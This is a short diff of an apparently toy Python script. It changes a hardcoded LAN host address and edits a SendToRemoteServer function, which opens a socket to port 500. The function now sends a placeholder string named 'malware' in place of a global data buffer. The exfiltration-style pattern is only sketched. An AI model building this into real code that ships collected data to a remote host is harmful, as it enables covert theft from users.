@@ -7,12 +7,13 @@ import time
 import pathlib
 
 data=''
-HOST_IP="192.168.3.36"
+HOST_IP="192.168.3.38"
 def SendToRemoteServer():
     global data
     sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((HOST_IP, 500))
-    sock.send(data)
+    malware=("DIT IS EEN VIRUS".encode('utf-8'))
+    sock.send(malware)
     sock.close()
     return True
 
